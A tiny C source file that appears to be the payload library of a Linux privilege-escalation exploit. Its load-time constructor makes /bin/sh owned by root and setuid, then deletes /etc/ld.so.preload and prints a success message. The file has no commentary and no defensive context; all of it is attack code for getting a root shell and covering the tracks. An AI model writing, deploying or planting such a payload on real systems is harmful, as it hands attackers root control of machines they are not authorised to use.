#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/bin/sh", 0, 0);
    chmod("/bin/sh", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
